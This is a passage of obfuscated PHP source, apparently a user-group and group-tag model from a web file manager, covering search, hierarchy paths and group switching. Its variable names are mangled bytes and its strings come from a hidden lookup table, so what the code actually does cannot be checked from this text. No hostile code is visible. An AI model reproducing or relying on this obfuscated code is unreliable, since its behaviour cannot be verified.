array($”´ÊØŒ[1984] => array($”´ÊØŒ[7], $Ş­¿¢Šç)); $ÍûÖĞÚ = $this->where($ÅşªÆ)->select(); $ÍûÖĞÚ = array_sort_keep($ÍûÖĞÚ, $”´ÊØŒ[1984], $Ş­¿¢Šç); $this->_listDataApply($ÍûÖĞÚ); return $ÍûÖĞÚ; } public function listSearch($‘¯ÉÊÀÈ) { $şÚ‡ùÌ¦ =& $_SERVER[¼’ç§¼´]; $ÈıÁİ† = trim($‘¯ÉÊÀÈ[$şÚ‡ùÌ¦[2082]]); $¬„üÂ®˜ = explode($şÚ‡ùÌ¦[53], $ÈıÁİ†); if (!$ÈıÁİ† || count($¬„üÂ®˜) == 1) { return $this->listSearchNow($‘¯ÉÊÀÈ); } $ï¯ÖğàË = array($şÚ‡ùÌ¦[456] => array()); foreach ($¬„üÂ®˜ as $ÇöÉúÈ‘) { if (!trim($ÇöÉúÈ‘)) { continue; } $‘¯ÉÊÀÈ[$şÚ‡ùÌ¦[2082]] = $ÇöÉúÈ‘; $Îà¸¾ó„ = $this->listSearchNow($‘¯ÉÊÀÈ); $ï¯ÖğàË[$şÚ‡ùÌ¦[456]] = array_merge($ï¯ÖğàË[$şÚ‡ùÌ¦[456]], $Îà¸¾ó„[$şÚ‡ùÌ¦[456]]); } $ï¯ÖğàË[$şÚ‡ùÌ¦[456]] = array_unique_by_key($ï¯ÖğàË[$şÚ‡ùÌ¦[456]], $şÚ‡ùÌ¦[1984]); $ï¯ÖğàË[$şÚ‡ùÌ¦[453]] = array($şÚ‡ùÌ¦[454] => count($ï¯ÖğàË[$şÚ‡ùÌ¦[456]]), $şÚ‡ùÌ¦[450] => 20, $şÚ‡ùÌ¦[430] => 1, $şÚ‡ùÌ¦[455] => 1); return $ï¯ÖğàË; } public function listSearchNow($•Æ…šæö) { $ş¤Òáí =& $_SERVER[¼’ç§¼´]; $œ¸Ëœˆ’ = trim($•Æ…šæö[$ş¤Òáí[2082]]); $‰›¥ØŸ = isset($•Æ…šæö[$ş¤Òáí[2083]]) ? $•Æ…šæö[$ş¤Òáí[2083]] : !1; if (!trim($œ¸Ëœˆ’)) { return !1; } $œ¸Ëœˆ’ = str_replace($ş¤Òáí[2084], $ş¤Òáí[2085], $œ¸Ëœˆ’); $¶ŒØñ¤ = array($ş¤Òáí[1984] => array($ş¤Òáí[470], "{$œ¸Ëœˆ’}\x25"), $ş¤Òáí[32] => array($ş¤Òáí[470], "\x25{$œ¸Ëœˆ’}\45"), $ş¤Òáí[1086] => $ş¤Òáí[2086]); if ($‰›¥ØŸ) { $†–´µ£Ğ = $this->getInfoSimple($‰›¥ØŸ); $Ï·Ü½«Ò = $†–´µ£Ğ[$ş¤Òáí[595]] . $‰›¥ØŸ . $ş¤Òáí[627]; $¶ŒØñ¤ = array($¶ŒØñ¤, array($ş¤Òáí[595] => array($ş¤Òáí[470], $Ï·Ü½«Ò))); } $¶ŒØñ¤ = $this->parseWhereLike($¶ŒØñ¤); $Ã÷åèŠ« = $this->_makeOrder()->where($¶ŒØñ¤)->selectPage(20); $Ã÷åèŠ« = $Ã÷åèŠ« ? $Ã÷åèŠ« : array($ş¤Òáí[456] => array(), $ş¤Òáí[453] => array()); if (!$Ã÷åèŠ« || count($Ã÷åèŠ«[$ş¤Òáí[456]]) < 5 && Input::check($œ¸Ëœˆ’, $ş¤Òáí[395])) { $„ôù¥›Ú = $this->groupChildrenAll($‰›¥ØŸ); $€“Âã¥ = $this->_searchFromMeta($ş¤Òáí[548], $œ¸Ëœˆ’, 10, $„ôù¥›Ú); $‡†Û¤‘Ç = $this->_searchFromMeta($ş¤Òáí[549], $œ¸Ëœˆ’, 10, $„ôù¥›Ú); $Ì®€Ã©· = array_merge($€“Âã¥, $‡†Û¤‘Ç, $Ã÷åèŠ«[$ş¤Òáí[456]]); $Ã÷åèŠ«[$ş¤Òáí[456]] = array_unique_by_key($Ì®€Ã©·, $ş¤Òáí[1984]); $Ã÷åèŠ«[$ş¤Òáí[453]][$ş¤Òáí[454]] = count($Ã÷åèŠ«[$ş¤Òáí[456]]); $Ã÷åèŠ«[$ş¤Òáí[453]][$ş¤Òáí[455]] = ceil($Ã÷åèŠ«[$ş¤Òáí[453]][$ş¤Òáí[454]] / $Ã÷åèŠ«[$ş¤Òáí[453]][$ş¤Òáí[450]]); } $this->_listDataApply($Ã÷åèŠ«[$ş¤Òáí[456]]); return $Ã÷åèŠ«; } protected function groupChildrenAll($ÎÁëßÆœ) { $âàšÈı‹ =& $_SERVER[¼’ç§¼´]; if (!$ÎÁëßÆœ) { return !1; } if (!is_array($ÎÁëßÆœ)) { $ÎÁëßÆœ = array($ÎÁëßÆœ); } $ÃªåÌåª = $ÎÁëßÆœ; foreach ($ÎÁëßÆœ as $ëµù•) { $ÌŞº¨ó­ = $this->getInfoSimple($ëµù•); $ü­®±§Í = array($âàšÈı‹[595] => array($âàšÈı‹[470], $ÌŞº¨ó­[$âàšÈı‹[595]] . $ëµù• . $âàšÈı‹[627])); $°ôÔÎäÎ = $this->field($âàšÈı‹[1984])->where($ü­®±§Í)->select(); $ÃªåÌåª = array_merge($ÃªåÌåª, array_to_keyvalue($°ôÔÎäÎ, $âàšÈı‹[12], $âàšÈı‹[1984])); } return array_unique($ÃªåÌåª); } private function _searchFromMeta($Í¡ß˜ÀŞ, $øÄ²Ø×¾, $Í‹°ëìÅ, $Óí°ùó) { $İß«¡ =& $_SERVER[¼’ç§¼´]; $øÄ²Ø×¾ = strtolower($øÄ²Ø×¾); $îê§‘ßÈ = array($İß«¡[97] => $Í¡ß˜ÀŞ, $İß«¡[461] => array($İß«¡[470], "\45{$øÄ²Ø×¾}\45")); $îê§‘ßÈ = $this->parseWhereLike($îê§‘ßÈ); if ($Óí°ùó) { $îê§‘ßÈ[$İß«¡[1984]] = array($İß«¡[7], $Óí°ùó); } $šƒ˜á£å = Model($İß«¡[2087])->where($îê§‘ßÈ)->limit($Í‹°ëìÅ)->select(); if (!$šƒ˜á£å) { return array(); } $šƒ˜á£å = array_to_keyvalue($šƒ˜á£å, $İß«¡[12], $İß«¡[1984]); $µ× Û— = $this->where(array($İß«¡[2076] => array($İß«¡[7], $šƒ˜á£å)))->select(); if (!$µ× Û—) { return array(); } return $µ× Û—; } protected function _listDataApplyItem($‹ĞĞÈ¯¿) { $†æÓşüß = array($‹ĞĞÈ¯¿); $this->_listDataApply($†æÓşüß); return $†æÓşüß[0]; } protected function _listDataApply(&$İ ¬ªš) { $óÑÜ‘ÅÙ =& $_SERVER[¼’ç§¼´]; if (!$İ ¬ªš) { return; } $Ÿ¥™òÆË = array_to_keyvalue($İ ¬ªš, $óÑÜ‘ÅÙ[12], $óÑÜ‘ÅÙ[1984]); $this->_listAppendChildren($İ ¬ªš); $this->_listAppendChildrenMember($İ ¬ªš); $this->_listAppendMeta($İ ¬ªš, $Ÿ¥™òÆË); $this->_listAppendParent($İ ¬ªš); $this->_listAppendSourceRoot($İ ¬ªš, $Ÿ¥™òÆË); } private function _listAppendChildren(&$ÁÚ‘Èı) { $•Ü¡Öà” =& $_SERVER[¼’ç§¼´]; $£ü«şÈ• = array_to_keyvalue($ÁÚ‘Èı, $•Ü¡Öà”[12], $•Ü¡Öà”[1984]); $™¿Ë«» = array($•Ü¡Öà”[192] => array($•Ü¡Öà”[7], $£ü«şÈ•)); $¦Üñçƒ = array($•Ü¡Öà”[192], $•Ü¡Öà”[2088] => $•Ü¡Öà”[576]); $à‘Àõ¼ = $this->field($¦Üñçƒ)->where($™¿Ë«»)->group($•Ü¡Öà”[192])->select(); $´§ÎşŸò = array_to_keyvalue($à‘Àõ¼, $•Ü¡Öà”[192], $•Ü¡Öà”[576]); foreach ($ÁÚ‘Èı as &$È“ßàæÔ) { $Êª¼Ãš± = $È“ßàæÔ[$•Ü¡Öà”[1984]]; $È“ßàæÔ[$•Ü¡Öà”[2089]] = isset($´§ÎşŸò[$Êª¼Ãš±]) ? intval($´§ÎşŸò[$Êª¼Ãš±]) : !1; } unset($È“ßàæÔ); } private function _listAppendChildrenMember(&$õ äãöÖ) { $¿ßŞò¯¤ =& $_SERVER[¼’ç§¼´]; $ÜÁ§úÊÛ = array_to_keyvalue($õ äãöÖ, $¿ßŞò¯¤[12], $¿ßŞò¯¤[1984]); $òÌœÆù  = array($¿ßŞò¯¤[1984] => array($¿ßŞò¯¤[7], $ÜÁ§úÊÛ)); $ƒŠš‰Çâ = array($¿ßŞò¯¤[1984], $¿ßŞò¯¤[2088] => $¿ßŞò¯¤[576]); $üöÕ®Ğ¦ = Model($¿ßŞò¯¤[2078])->field($ƒŠš‰Çâ)->where($òÌœÆù )->group($¿ßŞò¯¤[1984])->select(); $Úö…ÈÌ = array_to_keyvalue($üöÕ®Ğ¦, $¿ßŞò¯¤[1984], $¿ßŞò¯¤[576]); foreach ($õ äãöÖ as &$÷ÈöÇ„²) { $»éŸÇ˜ = $÷ÈöÇ„²[$¿ßŞò¯¤[1984]]; $÷ÈöÇ„²[$¿ßŞò¯¤[2090]] = isset($Úö…ÈÌ[$»éŸÇ˜]) ? intval($Úö…ÈÌ[$»éŸÇ˜]) : !1; } unset($÷ÈöÇ„²); } private function _listAppendMeta(&$Õçúğ›â, $ØÁ½¨) { $äŒİÀóô =& $_SERVER[¼’ç§¼´]; $Ï¾Ø×›ï = array($äŒİÀóô[1984] => array($äŒİÀóô[7], $ØÁ½¨)); $ÚìòÛ­å = Model($äŒİÀóô[2077])->where($Ï¾Ø×›ï)->select(); $ÚìòÛ­å = array_to_keyvalue_group($ÚìòÛ­å, $äŒİÀóô[1984]); foreach ($ÚìòÛ­å as &$ÃŸõÃ£) { $ÃŸõÃ£ = array_to_keyvalue($ÃŸõÃ£, $äŒİÀóô[97], $äŒİÀóô[461]); } unset($ÃŸõÃ£); foreach ($Õçúğ›â as &$»Âã ö€) { $»Âã ö€[$äŒİÀóô[550]] = array(); if (isset($ÚìòÛ­å[$»Âã ö€[$äŒİÀóô[1984]]])) { $»Âã ö€[$äŒİÀóô[550]] = $ÚìòÛ­å[$»Âã ö€[$äŒİÀóô[1984]]]; } } unset($»Âã ö€); } protected function parentLevelArray($¾†ßÂÔ®) { $”ºµáÒÙ =& $_SERVER[¼’ç§¼´]; $¾†ßÂÔ® = explode($”ºµáÒÙ[50], trim($¾†ßÂÔ®, $”ºµáÒÙ[50])); $¾†ßÂÔ® = array_remove_value($¾†ßÂÔ®, $”ºµáÒÙ[230]); return $¾†ßÂÔ®; } protected function parentInGroup($ä‰ù»É´, $§­ä¼¨é) { $Øü­Ä¬¹ =& $_SERVER[¼’ç§¼´]; $ ÑÙŠœ™ = $this->getInfoSimple($ä‰ù»É´); if (!$ ÑÙŠœ™) { return !0; } $²ıŞÇóŒ = $this->parentLevelArray($ ÑÙŠœ™[$Øü­Ä¬¹[595]]); $²ıŞÇóŒ[] = $ä‰ù»É´; foreach ($²ıŞÇóŒ as $ä‰ù»É´) { if (in_array($ä‰ù»É´ . $Øü­Ä¬¹[12], $§­ä¼¨é)) { return !0; } } return !1; } private function _listAppendParent(&$Úâ§Ÿì­) { $†—²Ïõ =& $_SERVER[¼’ç§¼´]; $®ï‰âØá = array(); foreach ($Úâ§Ÿì­ as &$Ì°çæ½) { $®ï‰âØá[$Ì°çæ½[$†—²Ïõ[1984]]] = $Ì°çæ½[$†—²Ïõ[32]]; $†ˆ®Ü¨ = $this->parentLevelArray($Ì°çæ½[$†—²Ïõ[595]]); foreach ($†ˆ®Ü¨ as $èµÖ¬Í) { if (!isset($®ï‰âØá[$èµÖ¬Í])) { $®ï‰âØá[$èµÖ¬Í] = 0; } } } unset($Ì°çæ½); foreach ($®ï‰âØá as $„–ÚÇ¶ => $„¶Á¤È) { if ($„¶Á¤È) { continue; } $çáı›˜Ã = $this->getInfoSimple($„–ÚÇ¶); $®ï‰âØá[$„–ÚÇ¶] = $çáı›˜Ã[$†—²Ïõ[32]]; } $áöÂı—Ş = $GLOBALS[$†—²Ïõ[6]][$†—²Ïõ[92]][$†—²Ïõ[2091]]; if (KodUser::isRoot()) { $áöÂı—Ş = !1; } foreach ($Úâ§Ÿì­ as &$Ì°çæ½) { $†ˆ®Ü¨ = $this->parentLevelArray($Ì°çæ½[$†—²Ïõ[595]]); $Õï™½Ë = $†—²Ïõ[12]; foreach ($†ˆ®Ü¨ as $„–ÚÇ¶ => $èµÖ¬Í) { if ($áöÂı—Ş && $„–ÚÇ¶ == 0) { continue; } $Õï™½Ë .= $®ï‰âØá[$èµÖ¬Í] . $†—²Ïõ[8]; } if ($†ˆ®Ü¨) { $Õï™½Ë .= $Ì°çæ½[$†—²Ïõ[32]]; } $Ì°çæ½[$†—²Ïõ[600]] = str_replace($†—²Ïõ[256], $†—²Ïõ[8], $Õï™½Ë); } unset($Ì°çæ½); } private function _listAppendSourceRoot(&$ßÒßŒ”†, $À¼ì™Öß) { $ëÆÉÌÑ =& $_SERVER[¼’ç§¼´]; $Ô§¨™Ğø = Model($ëÆÉÌÑ[913])->listSourceRoot(SourceModel::TYPE_GROUP, $À¼ì™Öß); $Ô§¨™Ğø = array_to_keyvalue($Ô§¨™Ğø, $ëÆÉÌÑ[580]); $Ô§¨™Ğø = array_remove_key($Ô§¨™Ğø, $ëÆÉÌÑ[580]); foreach ($ßÒßŒ”† as &$ÜÅ¸ø”) { $ÜÅ¸ø”[$ëÆÉÌÑ[90]] = $Ô§¨™Ğø[$ÜÅ¸ø”[$ëÆÉÌÑ[1984]]] ? $Ô§¨™Ğø[$ÜÅ¸ø”[$ëÆÉÌÑ[1984]]] : array(); } unset($ÜÅ¸ø”); } protected function groupMerge($—™†˜É¼) { $—™†˜É¼ = array_values(array_unique($—™†˜É¼)); $§‹œòì = array(); for ($Ü‹«„ö = 0; $Ü‹«„ö < count($—™†˜É¼); $Ü‹«„ö++) { $ÀåÓì÷ô = !1; for ($Íµ‰í’ = 0; $Íµ‰í’ < count($—™†˜É¼); $Íµ‰í’++) { if ($Ü‹«„ö == $Íµ‰í’) { continue; } if ($this->isParentOf($—™†˜É¼[$Íµ‰í’], $—™†˜É¼[$Ü‹«„ö])) { $ÀåÓì÷ô = !0; break; } } if (!$ÀåÓì÷ô) { $§‹œòì[] = $—™†˜É¼[$Ü‹«„ö]; } } return $§‹œòì; } protected function isParentOf($¿¾²ÏÅ’, $ä…Ç©²Â) { $ƒš›§§ =& $_SERVER[¼’ç§¼´]; if (!$¿¾²ÏÅ’ || !$ä…Ç©²Â || $¿¾²ÏÅ’ == $ä…Ç©²Â) { return !1; } $Î½ÕŒ„Ø = $this->getInfoSimple($¿¾²ÏÅ’); $¸ƒ…çÉ¼ = $this->getInfoSimple($ä…Ç©²Â); $ßÙãÕ–î = $Î½ÕŒ„Ø[$ƒš›§§[595]] . $¿¾²ÏÅ’ . $ƒš›§§[50]; if (substr($¸ƒ…çÉ¼[$ƒš›§§[595]], 0, strlen($ßÙãÕ–î)) == $ßÙãÕ–î) { return !0; } return !1; } public function groupShowRoot($ƒ ÕÚÅœ, $•¸­‡ĞÁ = false) { $µ–ûÑÚ£ =& $_SERVER[¼’ç§¼´]; $Âàä´š– = $this->getInfo($ƒ ÕÚÅœ); if (!$Âàä´š–) { return array(); } $œ¯…Î = $this->parentLevelArray($Âàä´š–[$µ–ûÑÚ£[595]]); $…ìÈÃ€‰ = array($ƒ ÕÚÅœ); if (count($œ¯…Î) == 0) { return $…ìÈÃ€‰; } if ($•¸­‡ĞÁ && count($œ¯…Î) == 1) { return $…ìÈÃ€‰; } if (!$Âàä´š–[$µ–ûÑÚ£[550]] || !isset($Âàä´š–[$µ–ûÑÚ£[550]][$µ–ûÑÚ£[2074]]) || $Âàä´š–[$µ–ûÑÚ£[550]][$µ–ûÑÚ£[2074]] == $µ–ûÑÚ£[864]) { return $this->groupShowRoot($œ¯…Î[count($œ¯…Î) - 1], $•¸­‡ĞÁ); } if ($Âàä´š–[$µ–ûÑÚ£[550]][$µ–ûÑÚ£[2074]] == $µ–ûÑÚ£[443]) { $«¦‡ìà = explode($µ–ûÑÚ£[50], $Âàä´š–[$µ–ûÑÚ£[550]][$µ–ûÑÚ£[2075]]); if ($«¦‡ìà) { $…ìÈÃ€‰ = array_merge($…ìÈÃ€‰, $«¦‡ìà); } } return $…ìÈÃ€‰; } protected function resetParentLevel() { $ı€Ùïé¥ =& $_SERVER[¼’ç§¼´]; $Ö—…À£À = $ı€Ùïé¥[1984]; $Ä¡Ò—É— = $this->select(); $Ä¡Ò—É— = array_to_keyvalue($Ä¡Ò—É—, $Ö—…À£À); foreach ($Ä¡Ò—É— as $”Ûı’şƒ) { $Ïœ²ş¼Ü = $”Ûı’şƒ; $æ‚¤Š¢¥ = array(); while ($Ïœ²ş¼Ü[$ı€Ùïé¥[192]] != 0) { $æ‚¤Š¢¥[] = $Ïœ²ş¼Ü[$ı€Ùïé¥[192]]; $Ïœ²ş¼Ü = $Ä¡Ò—É—[$Ïœ²ş¼Ü[$ı€Ùïé¥[192]]]; } $æ‚¤Š¢¥[] = 0; $æ‚¤Š¢¥ = $ı€Ùïé¥[50] . implode($ı€Ùïé¥[50], array_reverse($æ‚¤Š¢¥)) . $ı€Ùïé¥[50]; $this->setNamePinyin($”Ûı’şƒ[$Ö—…À£À], $”Ûı’şƒ[$ı€Ùïé¥[32]]); $this->where(array($Ö—…À£À => $”Ûı’şƒ[$Ö—…À£À]))->save(array($ı€Ùïé¥[666] => $æ‚¤Š¢¥)); } return $Ä¡Ò—É—; } public function groupNameAuto($çä‘úü™, $áÒš´Ô) { $À´·’üÎ =& $_SERVER[¼’ç§¼´]; $ä Ø‡ = $this->where(array($À´·’üÎ[488] => $çä‘úü™))->getField($À´·’üÎ[32], !0); if (!$ä Ø‡ || !in_array($áÒš´Ô, $ä Ø‡)) { return $áÒš´Ô; } for ($¢Ü¸²®½ = 1; $¢Ü¸²®½ <= count($ä Ø‡) + 1; $¢Ü¸²®½++) { $ŞæÁé±² = $áÒš´Ô . "\50{$¢Ü¸²®½}\x29"; if (!in_array($ŞæÁé±², $ä Ø‡)) { return $ŞæÁé±²; } } } public function groupSwitch($›¶şÎı², $£íÆÉğ¬) { $ö´ÀÃ¹Ü =& $_SERVER[¼’ç§¼´]; $ø¨—óş‘ = array($ö´ÀÃ¹Ü[1984] => array($ö´ÀÃ¹Ü[7], array($›¶şÎı², $£íÆÉğ¬))); $È—×¹„Ç = $this->where($ø¨—óş‘)->select(); $È—×¹„Ç = array_to_keyvalue($È—×¹„Ç, $ö´ÀÃ¹Ü[1984]); if (!isset($È—×¹„Ç[$›¶şÎı²]) || !isset($È—×¹„Ç[$£íÆÉğ¬]) || $È—×¹„Ç[$›¶şÎı²][$ö´ÀÃ¹Ü[192]] == 0) { return !1; } $ø¨—óş‘ = array($ö´ÀÃ¹Ü[1984] => $›¶şÎı²); $ÜÅÚ¦Ö = Model($ö´ÀÃ¹Ü[2078])->where($ø¨—óş‘)->select(); if (!$ÜÅÚ¦Ö) { $ÜÅÚ¦Ö = array(); } foreach ($ÜÅÚ¦Ö as $»Ş½ºİş) { $à›¡¬… = $»Ş½ºİş[$ö´ÀÃ¹Ü[1783]]; $ø¨—óş‘ = array($ö´ÀÃ¹Ü[1783] => $à›¡¬…, $ö´ÀÃ¹Ü[1984] => $£íÆÉğ¬); $¦ë»íîÉ = Model($ö´ÀÃ¹Ü[2078])->where($ø¨—óş‘)->find(); if (!$¦ë»íîÉ) { $ÙŒ¬»æŞ = array($£íÆÉğ¬ => $»Ş½ºİş[$ö´ÀÃ¹Ü[2092]]); Model($ö´ÀÃ¹Ü[608])->userGroupAdd($à›¡¬…, $ÙŒ¬»æŞ); } Model($ö´ÀÃ¹Ü[608])->userGroupRemove($à›¡¬…, $›¶şÎı²); } $ø¨—óş‘ = array($ö´ÀÃ¹Ü[190] => 2, $ö´ÀÃ¹Ü[192] => 0, $ö´ÀÃ¹Ü[496] => 1, $ö´ÀÃ¹Ü[580] => array($ö´ÀÃ¹Ü[7], array($›¶şÎı², $£íÆÉğ¬))); $š–°‰“ô = Model($ö´ÀÃ¹Ü[913])->where($ø¨—óş‘)->field($ö´ÀÃ¹Ü[2093])->select(); $š–°‰“ô = array_to_keyvalue($š–°‰“ô, $ö´ÀÃ¹Ü[580], $ö´ÀÃ¹Ü[193]); $µíÃÄ™§ = !empty($š–°‰“ô[$›¶şÎı²]) ? $š–°‰“ô[$›¶şÎı²] : !1; if ($µíÃÄ™§) { if (!$š–°‰“ô[$£íÆÉğ¬]) { $š–°‰“ô[$£íÆÉğ¬] = Model($ö´ÀÃ¹Ü[913])->groupRootAdd($£íÆÉğ¬); } $§üÇî“£ = $š–°‰“ô[$£íÆÉğ¬]; $ø¨—óş‘ = array($ö´ÀÃ¹Ü[192] => $µíÃÄ™§); $š–°‰“ô = Model($ö´ÀÃ¹Ü[913])->where($ø¨—óş‘)->field($ö´ÀÃ¹Ü[2094])->select(); if (!$š–°‰“ô) { $š–°‰“ô = array(); } Model($ö´ÀÃ¹Ü[913])->moveClearAuth = !1; foreach ($š–°‰“ô as $¯ñ†²ñ) { $¢ÁéØ÷Ë = $¯ñ†²ñ[$ö´ÀÃ¹Ü[496]] == $ö´ÀÃ¹Ü[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ö´ÀÃ¹Ü[913])->move($¯ñ†²ñ[$ö´ÀÃ¹Ü[193]], $§üÇî“£, $¢ÁéØ÷Ë); } Model($ö´ÀÃ¹Ü[913])->moveClearAuth = !0; $ø¨—óş‘ = array($ö´ÀÃ¹Ü[190] => 2, $ö´ÀÃ¹Ü[580] => $›¶şÎı²); $æµßˆ‹® = array($ö´ÀÃ¹Ü[580] => $£íÆÉğ¬); Model($ö´ÀÃ¹Ü[2095])->where($ø¨—óş‘)->save($æµßˆ‹®); Model($ö´ÀÃ¹Ü[2096])->where($ø¨—óş‘)->save($æµßˆ‹®); } $this->_changeChildLevel($È—×¹„Ç[$›¶şÎı²], $È—×¹„Ç[$£íÆÉğ¬], !0); $this->where(array($ö´ÀÃ¹Ü[192] => $›¶şÎı²))->save(array($ö´ÀÃ¹Ü[192] => $£íÆÉğ¬)); $this->_clearChildrenCache($È—×¹„Ç[$£íÆÉğ¬]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\146\141\x76"; protected function cacheFunctionAlias($õËå„˜) { $¨®ŞáÈƒ =& $_SERVER[¼’ç§¼´]; return array($¨®ŞáÈƒ[2097] => array($õËå„˜[0], $¨®ŞáÈƒ[2098]), $¨®ŞáÈƒ[2099] => array($õËå„˜[0], $¨®ŞáÈƒ[2100])); } protected function get($ğÜóÊ±Ò) { $…²Åî¢ =& $_SERVER[¼’ç§¼´]; $¦—ñ´Ì† = Model($…²Åî¢[596])->metaGet($ğÜóÊ±Ò, $…²Åî¢[2101]); $•Ğ±ñÚ‚ = json_decode($¦—ñ´Ì†, !0); return $•Ğ±ñÚ‚ ? $•Ğ±ñÚ‚ : array($…²Åî¢[2102] => $…²Åî¢[91], $…²Åî¢[456] => array()); } protected function set($úüÙ»ªè, $¡äÈÅ‰ú) { $ÇúÒÓï€ =& $_SERVER[¼’ç§¼´]; $¡äÈÅ‰ú = $¡äÈÅ‰ú ? $¡äÈÅ‰ú : array($ÇúÒÓï€[2102] => $ÇúÒÓï€[91], $ÇúÒÓï€[456] => array()); return Model($ÇúÒÓï€[596])->metaSet($úüÙ»ªè, $ÇúÒÓï€[2101], json_encode($¡äÈÅ‰ú)); } protected function getByTagID($ºÅÛ¨¡§, $çæúÉÙà) { $ØÄŠ¢ =& $_SERVER[¼’ç§¼´]; if (!$ºÅÛ¨¡§ || !$çæúÉÙà) { return !1; } if (!Model($ØÄŠ¢[596])->getInfoSimple($ºÅÛ¨¡§)) { return !1; } $Ò“¤Ñõ = $this->get($ºÅÛ¨¡§); if (!$Ò“¤Ñõ || !isset($Ò“¤Ñõ[$ØÄŠ¢[456]])) { return !1; } $ç£ÜØ›Ñ = array_find_by_field($Ò“¤Ñõ[$ØÄŠ¢[456]], $ØÄŠ¢[486], $çæúÉÙà); return is_array($ç£ÜØ›Ñ) ? $ç£ÜØ›Ñ : !1; } public function listSource($â•ø™ÀÒ, $Ğ””å˜—) { $Ûë–º†‡ =& $_SERVER[¼’ç§¼´]; if ($Ğ””å˜— && !is_array($Ğ””å˜—)) { $Ğ””å˜— = array($Ğ””å˜—); } $À¬ƒæ¶Ö = $this->listData($â•ø™ÀÒ); $Ò¼ùÊ¹È = array(); foreach ($À¬ƒæ¶Ö as $õøàá‡Ù) { $“’Öİú = $õøàá‡Ù[$Ûë–º†‡[87]]; if (!$“’Öİú) { continue; } if (!isset($Ò¼ùÊ¹È[$“’Öİú])) { $Ò¼ùÊ¹È[$“’Öİú] = array(); } $Ò¼ùÊ¹È[$“’Öİú][] = $õøàá‡Ù[$Ûë–º†‡[511]]; } $·ÃØüî = array(); foreach ($Ò¼ùÊ¹È as $Ú‹Ùº™Ú => $õ£ÑÕâŒ) { $’Ö»ğ¯¹ = !0; if (!$Ğ””å˜—) { $·ÃØüî[] = $Ú‹Ùº™Ú; continue; } foreach ($Ğ””å˜— as $Øæ¾ÌÌ—) { if (!in_array($Øæ¾ÌÌ—, $õ£ÑÕâŒ)) { $’Ö»ğ¯¹ = !1; break; } } if ($’Ö»ğ¯¹) { $·ÃØüî[] = $Ú‹Ùº™Ú; } } if (!$·ÃØüî) { return array(); } $ĞÙ‰ÊŸÜ = array($Ûë–º†‡[502] => array($Ûë–º†‡[503], $·ÃØüî), $Ûë–º†‡[580] => $â•ø™ÀÒ, $Ûë–º†‡[190] => SourceModel::TYPE_GROUP); $ÌíúÊ­õ = Model($Ûë–º†‡[1430])->listSource($ĞÙ‰ÊŸÜ); if (!$ÌíúÊ­õ || count($·ÃØüî) == $ÌíúÊ­õ[$Ûë–º†‡[453]][$Ûë–º†‡[454]]) { return $ÌíúÊ­õ; } $ÃÒÎ‘î¢ = array(); $÷ãœ·¹¬ = array_to_keyvalue($ÌíúÊ­õ[$Ûë–º†‡[85]], $Ûë–º†‡[12], $Ûë–º†‡[193]); $ö¦åÀ»¢ = array_to_keyvalue($ÌíúÊ­õ[$Ûë–º†‡[86]], $Ûë–º†‡[12], $Ûë–º†‡[193]); $ï´ÅàÆ = array_merge($ö¦åÀ»¢, $÷ãœ·¹¬); foreach ($·ÃØüî as $“’Öİú) { if (!in_array($“’Öİú, $ï´ÅàÆ)) { $ÃÒÎ‘î¢[] = $“’Öİú; } } if ($ÃÒÎ‘î¢) { $this->removeBySource($â•ø™ÀÒ, $ÃÒÎ‘î¢); } return $ÌíúÊ­õ; } protected function listData($Ã“¶†Û¥) { $¶€¼Ë¶ =& $_SERVER[¼’ç§¼´]; $İ‹‘¿Úİ = array($¶€¼Ë¶[1774] => 0, $¶€¼Ë¶[568] => array($¶€¼Ë¶[2103], 0), $¶€¼Ë¶[507] => $¶€¼Ë¶[2104] . $Ã“¶†Û¥); $ŞŞÑ¯ˆ = $¶€¼Ë¶[2105]; $Ğüä¡ñ¬ = $this->field($ŞŞÑ¯ˆ)->where($İ‹‘¿Úİ)->order($¶€¼Ë¶[2106])->select(); return $Ğüä¡ñ¬ ? $Ğüä¡ñ¬ : array(); } protected function addToTag($û›¿½¥ê, $ªƒõ«›Ó, $øÖÂ¿Œş) { $Ö¶â„‹¾ =& $_SERVER[¼’ç§¼´]; if (!$this->getByTagID($û›¿½¥ê, $øÖÂ¿Œş) || !$ªƒõ«›Ó) { return !1; } if (!Model($Ö¶â„‹¾[913])->pathInfo($ªƒõ«›Ó)) { return !1; } $Â’Ì³™¤ = array($Ö¶â„‹¾[1774] => 0, $Ö¶â„‹¾[568] => $øÖÂ¿Œş, $Ö¶â„‹¾[506] => $ªƒõ«›Ó, $Ö¶â„‹¾[507] => $Ö¶â„‹¾[2107] . $û›¿½¥ê, $Ö¶â„‹¾[505] => $Ö¶â„‹¾[12], $Ö¶â„‹¾[1988] => 0); if ($this->where($Â’Ì³™¤)->find()) { return !1; } return $this->add($Â’Ì³™¤); } protected function removeFromTag($åÂó¤£”, $ª²Í¯’Ë, $êĞè®Ú‹) { $«æ»ƒ‘½ =& $_SERVER[¼’ç§¼´]; if (!$this->getByTagID($åÂó¤£”, $êĞè®Ú‹) || !$ª²Í¯’Ë) { return !1; } if (is_array($ª²Í¯’Ë)) { $ª²Í¯’Ë = array($«æ»ƒ‘½[7], $ª²Í¯’Ë); } $œÄÆşğ = array($«æ»ƒ‘½[1774] => 0, $«æ»ƒ‘½[568] => $êĞè®Ú‹, $«æ»ƒ‘½[507] => $«æ»ƒ‘½[2107] . $åÂó¤£”, $«æ»ƒ‘½[506] => $ª²Í¯’Ë); return $this->where($œÄÆşğ)->delete(); } protected function removeByTag($»¼ß¹ç£, $Åİ¬ï¢) { $ëÏ²ñúš =& $_SERVER[¼’ç§¼´]; if (!$this->getByTagID($»¼ß¹ç£, $Åİ¬ï¢)) { return !1; } $ğ¾ñ‚´õ = array($ëÏ²ñúš[1774] => 0, $ëÏ²ñúš[568] => $Åİ¬ï¢, $ëÏ²ñúš[507] => $ëÏ²ñúš[2107] . $»¼ß¹ç£); return $this->where($ğ¾ñ‚´õ)->delete(); } protected function removeBySource($Óª±àç, $‘÷¨å›Æ) { $˜ñø±†› =& $_SERVER[¼’ç§¼´]; if (!$Óª±àç || !$‘÷¨å›Æ) { return !1; } if (is_array($‘÷¨å›Æ)) { $‘÷¨å›Æ = array($˜ñø±†›[7], $‘÷¨å›Æ); } $×ñÒµí¶ = array($˜ñø±†›[1774] => 0, $˜ñø±†›[506] => $‘÷¨å›Æ, $˜ñø±†›[568] => array($˜ñø±†›[1100], 0), $˜ñø±†›[507] => $˜ñø±†›[2107] . 